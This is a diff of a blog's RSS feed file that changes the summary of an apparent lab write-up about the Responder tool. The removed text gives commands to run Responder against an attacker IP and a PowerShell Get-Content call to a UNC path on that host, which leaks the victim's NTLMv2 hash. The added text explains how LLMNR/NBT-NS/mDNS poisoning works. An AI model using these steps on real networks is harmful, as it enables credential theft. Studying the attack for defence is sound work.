@@ -26,10 +26,8 @@
       <pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate>
       
       <guid>https://0xade1.github.io/devdraft/posts/2020/05/responder/</guid>
-      <description>Installation My docker environment do not have access to utun4 Kali Responder
-1 2 3 4 5 git clone https://github.com/lgandx/Responder.git cd Responder sudo python Responder.py -i 10.10.14.73 -wrf [...] [+] Listening for events... Then from the victim side, we use powershell to attempt collecting the password hash of the current user:
-1 Get-Content \\10.10.14.73\randomFileName Responder will intercept the following hash
-1 2 3 4 5 6 [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.</description>
+      <description>what is responder Responder is basically a lyer or a poisoner &amp;hellip; there is a ton of broadcasted or multicast messages on the network such as those protocols:
+LLMNR - Link-Local Multicast Name Resolution [NBT-NS - NetBIOS Name Service] [mDNS] When those resolution protocols broadcast the network asking &amp;ldquo;Where is machine A?&amp;rdquo;, responder will pretend &amp;ldquo;Hey, it&amp;rsquo;s me!&amp;rdquo; and the remote machine will starts to talk with responder sharing some windows hashes and otherthings that can be:</description>
     </item>
     
   </channel>
